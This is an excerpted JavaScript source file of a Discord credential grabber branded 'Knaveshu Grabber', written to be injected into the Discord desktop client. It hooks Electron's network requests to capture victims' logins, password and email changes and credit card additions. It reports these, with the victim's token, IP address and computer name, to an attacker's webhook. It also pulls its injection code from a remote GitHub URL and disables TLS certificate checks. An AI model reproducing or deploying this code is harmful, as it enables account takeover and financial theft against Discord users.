...
var config = {
    ...
    injection_url: "https://raw.githubusercontent.com/Knaveshu/injection/main/index.js",
    webhook: "%WEBHOOK%",
...
const makeEmbed = async ({
    ...
    var params = {
        username: "Knaveshu Grabber",
        avatar_url: "https://cdn.discordapp.com/avatars/1052682703083937802/57ad55a6992e3903352079ebeb16eea2.webp?size=1024",
        content: "",
        embeds: [{
            title: title,
            ...
            footer: {
                text: "©KSCH | https://github.com/Knaveshu"
            },
...
const FirstTime = async () => {
    ...
    if (!token) {
        ...
        if (!user.avatar) var userAvatar = "https://images-ext-1.discordapp.net/external/yhWbr2Xuzl62ozIJtjk9K6MecFS_CTKbXYYkOFpTvUo/%3Fsize%3D1024/https/cdn.discordapp.com/avatars/1059022867649531974/cf8e5a54f8eef06cc49df1d0ab4f3fbc.webp?width=676&height=676"
        if (!user.banner) var userBanner = "https://cdn.discordapp.com/banners/347871579780153354/b25633a3cb5312ee6a1c714599788dfd.png?size=4096"
        ...
        var params = await makeEmbed({
            ...
            fields: [{
                ...
                name: "@Copyright",
                value: `[Knaveshu 2023 <a:blackcapgif:1041634542093619260>](https://github.com/Knaveshu/Knaveshu-Grabber)`,
                inline: !0
            }, {
    ...
    if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
        if (!token) {
            var params = await makeEmbed({
                title: "Knaveshued User log out (User not Logged in before)",
                fields: [{
                    name: "Injection Info",
            ...
            userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
            var params = await makeEmbed({
                title: "Knaveshu Victim got logged out",
                fields: [{
                    name: "Injection Info",
                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
                    inline: !1
...
electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async (request, callback) => {
    ...
    switch (true) {
        case request.url.endsWith("login"):
            ...
            var params = await makeEmbed({
                title: "Knaveshu User Login",
                description: "[<a:blackcapgif:1041634542093619260>  **Oh you have Knaveshued someone**](https://github.com/Knaveshu)",
                color: config['embed-color'],
                fields: [{
                    name: "Injection Info",
                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
        ...
        case request.url.endsWith("users/@me"):
            ...
            if (data.new_password) {
                var params = await makeEmbed({
                    title: "Knaveshu Detect Password Changed",
                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have Knaveshued someone**](https://github.com/Knaveshu)",
                    color: config['embed-color'],
                    fields: [{
                        name: "Injection Info",
            ...
            if (data.email) {
                var params = await makeEmbed({
                    title: "Knaveshu Detect Email Changed",
                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have Knaveshued someone**](https://github.com/Knaveshu)",
                    color: config['embed-color'],
                    fields: [{
                        name: "Injection Info",
        ...
        case request.url.endsWith("tokens"):
            ...
            var params = await makeEmbed({
                title: "Knaveshu User Credit Card Added",
                description: `
                **IP:** ${ip}\n\n
...
module.exports = require("./core.asar")process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0
